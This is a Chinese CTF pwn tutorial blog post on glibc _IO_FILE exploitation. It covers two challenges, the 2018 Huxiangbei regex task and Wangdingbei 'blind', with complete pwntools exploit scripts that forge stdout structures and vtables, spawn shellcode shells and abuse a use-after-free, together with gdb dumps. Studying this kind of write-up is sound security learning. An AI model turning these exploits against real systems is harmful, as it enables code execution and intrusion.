---
layout: post
title: "pwn中的IO_FILE从入门到深入"
date: 2019-04-25
categories: jekyll update
---

### pwn中的IO_FILE从入门到深入

### 湖湘杯2018
本来周五好好学了一下house of orange，大概了解了一下如何伪造IO_FILE来进行利用，某次比赛愣是死在了如何逆这个傻逼的正则匹配上，然后各种想办法想泄露地址。。方向就错了，然后也想过伪造`IO_FILE`来做，因为之前还没理解好，愣是没去做，今天看wp发现这简直就是伪造IO_FILE做pwn利用的hello world啊。那我们就从这道题目讲起IO_FILE。

这是一道匹配正则表达式的题目，但其实重点不在匹配上面，而是stdin和stdout在bss段上，而且我们可以覆盖控制，这才是重点~

```
.bss:0804A240 ; FILE *stdin
.bss:0804A240 stdin           dd ?                    ; DATA XREF: LOAD:0804828C↑o
.bss:0804A240                                         ; main+14↑r
.bss:0804A240                                         ; Copy of shared data
.bss:0804A244                 public stdout
.bss:0804A244 ; FILE *stdout
.bss:0804A244 stdout          dd ?                    ; DATA XREF: LOAD:080482AC↑o
.bss:0804A244                                         ; main+32↑r
.bss:0804A244                                         ; Copy of shared data
```

而且刚好`v10 = read(0, &buf_1d0[v0], 0x64u);  `这个第一个read就可以输入0x64个字节并且能控制到`0804A244`，同时在`read(0, &buf_24c, 0x3E8u);`第二个read上面我们可以进行读入0x3e8这么大的buffer，正好可以用来伪造`_IO_FILE `。

先来看一张很常见的图：

<img src="/images/posts/IO_FILE/1542635898575.png" >

`struct _IO_FILE_plus`包含了`struct _IO_FILE`和一个指针`struct _IO_jump_t`
分析一下这个题要咋做，首先这道题是32位的，而且一个保护都没有开，所以是可以往`bss`段写`shellcode`并且执行的。然后看了上面这张图我们可以知道，我们可以伪造`IO_FILE`，同时伪造`vtable`，`vtable`主要就是一个跳转表，可以劫持某个函数的执行流程，让他调用某个函数的时候跳到`shellcode`去执行，这样就可以`getshell`了。
那么我们下面进行伪造，他的结构大概是这样的：

```
	'i386':{
		0x0:'_flags',
		0x4:'_IO_read_ptr',
		0x8:'_IO_read_end',
		0xc:'_IO_read_base',
		0x10:'_IO_write_base',
		0x14:'_IO_write_ptr',
		0x18:'_IO_write_end',
		0x1c:'_IO_buf_base',
		0x20:'_IO_buf_end',
		0x24:'_IO_save_base',
		0x28:'_IO_backup_base',
		0x2c:'_IO_save_end',
		0x30:'_markers',
		0x34:'_chain',
		0x38:'_fileno',
		0x3c:'_flags2',
		0x40:'_old_offset',
		0x44:'_cur_column',
		0x46:'_vtable_offset',<==这里如果不是零可能会影响IO_FILE寻找vtable的地址
		0x47:'_shortbuf',
		0x48:'_lock',
		0x4c:'_offset',
		0x54:'_codecvt',
		0x58:'_wide_data',
		0x5c:'_freeres_list',
		0x60:'_freeres_buf',
		0x64:'__pad5',
		0x68:'_mode',
		0x6c:'_unused2',
		0x94:'vtable'
	},
#IO_FILE中有个_vtable_offset字段，也就是说通过_IO_FILE指针寻找_IO_jump_t函数表指针的时候不是直接+0x94得到的，而是通过+0x94+offset得到的，之前我们输入的offset可能会很大，导致访存错误，所以我们伪造的时候要注意偏移0x46处的内容。
```

我们要伪造的有两部分，一个是IO_FILE，一个是vtable，最后写上shellcode。
下面时候IO_FILE：

```
fake_IO_stdout = p32(0xfbad8000) + p32(0x0804A44C)*8 + p32(0)*4
fake_IO_stdout += p32(0x0804A44C) + p32(1) + p32(0) + p32(0xffffffff)
fake_IO_stdout += p32(0) + p32(0x0804A44C) + p32(0xffffffff)*2
fake_IO_stdout += p32(0) + p32(0x0804A44C) + p32(0)*3
fake_IO_stdout += p32(0xffffffff) + p32(0)*10 + p32(fake_vtable)
fake_IO_stdout += p32(0x0804A44C) + p32(0x0804A44C)
#注：0x0804A44C这个地址是随便给的，下面那个构造也是可以的
```

```
fake_IO_stdout = p32(0xfbad8000) + p32(0xffffffff)*8 + p32(0)*4
fake_IO_stdout += p32(0xffffffff) + p32(1) + p32(0) + p32(0xffffffff)#stdin_addr 0x0804A44C
fake_IO_stdout += p32(0) + p32(0xffffffff) + p32(0xffffffff)*2
fake_IO_stdout += p32(0) + p32(0xffffffff) + p32(0)*3
fake_IO_stdout += p32(0xffffffff) + p32(0)*10 + p32(fake_vtable)
fake_IO_stdout += p32(0xffffffff) + p32(0xffffffff)
```

下面是vtable+shellcode：

```
payload = 'a'*28 + p32(0x0804A24C + 0x120) + asm(shellcraft.sh())
```

详细脚本如下：

```
from pwn import *

context.binary = "./pwn1"
context.log_level="debug"

p = process("./pwn1")
#p = remote('47.106.243.235',8888)

p.recvuntil('format\n')
p.sendline('a')

fake_IO_stdout_addr = 0x0804A24C
fake_vtable = 0x0804A24C + 0x100 
#0x0804A44C
fake_IO_stdout = p32(0xfbad8000) + p32(0xffffffff)*8 + p32(0xffffffff)*4
fake_IO_stdout += p32(0xffffffff) + p32(0xffffffff) + p32(0xffffffff) + p32(0xffffffff)#stdin_addr 0x0804A44C
fake_IO_stdout += p32(0) + p32(0xffffffff) + p32(0xffffffff)*2
fake_IO_stdout += p32(0) + p32(0xffffffff) + p32(0)*3
fake_IO_stdout += p32(0xffffffff) + p32(0)*10 + p32(fake_vtable)
fake_IO_stdout += p32(0xffffffff) + p32(0xffffffff)

'''
gdb-peda$ x /50xw 0x804a24c
0x804a24c:	0xfbad8000	0x0804a44c	0x0804a44c	0x0804a44c
0x804a25c:	0x0804a44c	0x0804a44c	0x0804a44c	0x0804a44c
0x804a26c:	0x0804a44c	0x00000000	0x00000000	0x00000000
0x804a27c:	0x00000000	0x0804a44c	0x00000001	0x00000000
0x804a28c:	0xffffffff	0x00000000	0x0804a44c	0xffffffff
0x804a29c:	0xffffffff	0x00000000	0x0804a44c	0x00000000
0x804a2ac:	0x00000000	0x00000000	0xffffffff	0x00000000
0x804a2bc:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2cc:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2dc:	0x00000000	0x0804a34c	0x0804a44c	0x0804a44c
'''

fake_IO_stdout = fake_IO_stdout.ljust(0x100,'\x00')

payload = fake_IO_stdout + 'a'*28 + p32(0x0804A24C + 0x120) + asm(shellcraft.sh())
#change_printf(__xsputn) -->shellcode
'''
gdb-peda$ x /30xw 0x0804A34C
0x804a34c:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a35c:	0x61616161	0x61616161	0x61616161	0x0804a36c
0x804a36c:	0x2f68686a	0x68732f2f	0x6e69622f	0x0168e389
0x804a37c:	0x81010101	0x69722434	0xc9310101	0x59046a51
0x804a38c:	0x8951e101	0x6ad231e1	0x80cd580b	0x0000000a
'''

p.recvuntil('match\n')
pause()
p.sendline(payload)

p.recvuntil('?[Y/n]\n')
p.sendline('Y')

p.recvuntil('format\n')
p.sendline('a'*0x49 + p32(fake_IO_stdout_addr)) #fake stdout

p.interactive()
```

在printf的时候触发执行shellcode

<img src="/images/posts/IO_FILE/1542636817985.png" >

```
gdb-peda$ p *(struct _IO_FILE_plus *)0x804a24c
$1 = {
  file = {
    _flags = 0xfbad8000, 
    _IO_read_ptr = 0x804a44c "", 
    _IO_read_end = 0x804a44c "", 
    _IO_read_base = 0x804a44c "", 
    _IO_write_base = 0x804a44c "", 
    _IO_write_ptr = 0x804a44c "", 
    _IO_write_end = 0x804a44c "", 
    _IO_buf_base = 0x804a44c "", 
    _IO_buf_end = 0x804a44c "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x804a44c, 
    _fileno = 0x1, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x804a44c, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x804a44c, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' <repeats 39 times>
  }, 
  vtable = 0x804a34c
}

gdb-peda$ p *((struct _IO_FILE_plus *)0x804a24c).vtable
$2 = {
  __dummy = 0x61616161, 
  __dummy2 = 0x61616161, 
  __finish = 0x61616161, 
  __overflow = 0x61616161, 
  __underflow = 0x61616161, 
  __uflow = 0x61616161, 
  __pbackfail = 0x61616161, 
  __xsputn = 0x804a36c, <==改的主要是这个地方。
  __xsgetn = 0x2f68686a, 
  __seekoff = 0x68732f2f, 
  __seekpos = 0x6e69622f, 
  __setbuf = 0x168e389, 
  __sync = 0x81010101, 
  __doallocate = 0x69722434, 
  __read = 0xc9310101, 
  __write = 0x59046a51, 
  __seek = 0x8951e101, 
  __close = 0x6ad231e1, 
  __stat = 0x80cd580b, 
  __showmanyc = 0xa, 
  __imbue = 0x0
}
```

参考链接：
+ [湖湘杯wp](http://myhackerworld.top/2018/11/18/2018%E6%B9%96%E6%B9%98%E6%9D%AF-writesup/?tdsourcetag=s_pcqq_aiomsg)
+ [FSOP以及glibc针对其所做的防御措施](http://blog.dazzlepppp.cn/2017/02/04/FSOP%E4%BB%A5%E5%8F%8Aglibc%E9%92%88%E5%AF%B9%E5%85%B6%E6%89%80%E5%81%9A%E7%9A%84%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD/)

### 进阶篇1---网鼎杯 blind(fastbins attack+IO_FILE)
该题有new+change+free，其中free的时候没有把指针清空，可以进行UAF操作形成一个fastbin attack，进而利用这个来修改fd，把堆分配到bss段上，进而控制chunk的指针列表，形成任意地址写的操作(因为这道题没有打印输出)。最后伪造IO_FILE，调用printf的时候跳到system去执行。
主要漏洞：UAF、Double Free
详细脚本：

```
from pwn import *
context.log_level='debug'
p=process('./blind')
p.recv()
def pr():
    p.recvuntil('ice:')
def new(index,content,sh=0):
    p.send('1\n')
    p.recvuntil('Index:')
    p.send(str(index))
    p.recvuntil(':')
    p.sendline(content)
    if sh==1:
        p.interactive()
    pr()

def change(index,content,sh=0):
    p.send('2\n')
    p.recvuntil('Index:')
    p.send(str(index))
    p.recvuntil(':')
    p.sendline(content)
    if sh==1:
        p.interactive()
    pr()

def free(index):
    p.send('3\n')
    p.recvuntil('Index:')
    p.send(str(index))
    pr()

def write(addr,v,sh=0):
    change(0,p64(0x602060)+p64(addr))
    change(1,v,sh)

puts=0x601FA0
ptr=0x602060
target=0x60201d
shell=0x4008E3
new(0,"Team233")#new 0
free(0)#free 0---while release without change the ptr with chunk 0 to null
change(0,p64(target))#bug-->change without check the chunk whether free,change the vules of bss's addr directly .
new(5,p64(shell)*10)
new(3,'\x00'*3+'\x00'*0x30+p64(0x602060))#success malloc the chunk in target=0x60201d(for change the chunk 0 ptr to 0x60201d,and it can write data into bss .so that we can control the chunk list ptr.)

#and then we can write data everywhere.
#next ---we can make the fake IO_FILE

write(0x602100,p64(0xfbada887)+p64(0)*7+p64(1))
write(0x6021d8,p64(0x602200))#vtable_addr = 0x602200
write(0x602200, p64(shell)*8)
pause()
write(0x602020,p64(0x602100),1)#write stdout = 0x602020 and next printf(__xsputn)-->getshell
p.interactive()
```

#### blind的另外一个思路
用同样的方法先完成任意地址写，然后可以直接在bss段上伪造一个unsorted bin，然后把他free掉，同时让fd和bk(`main_arena+88`)落在chunk list上面，然后就可以修改libc里面的东西了。
同时有一个特点，在这个版本的libc中将`mainarena+88`的最低位改成`\x00`，恰好变成`\_malloc_hook-0x10`。因此找到一个新的想法，题目所用的编辑函数中会在输入的末位写`\x00`，可以将`ptr[4]`，指向`ptr[0]`，在编辑时，可以将`ptr[0]`写成`__malloc_hook-0x10`，这样再次编辑`ptr[0]`就可以将`__malloc_hook`改成题目中给的`system(“/bin/sh”)`函数，从而拿到`shell`了。
参考链接：
+ [大佬IO_FILE笔记](https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
+ [P4nda大佬的另外一个思路](http://p4nda.top/2018/08/27/WDBCTF-2018/)

### 进阶篇2---HITCON2016   house of orange


参考链接：
+ [【技术分享】溢出利用FILE结构体](https://www.anquanke.com/post/id/84987)
+ [abusing the FILE structure[大概是最早提出这个利用的blog]](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)
+ [HITCON CTF Qual 2016 - House of Orange Write up---Angelboy](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)
+ [【CTF攻略】CTF Pwn之创造奇迹的Top Chunk](https://www.anquanke.com/post/id/84965)
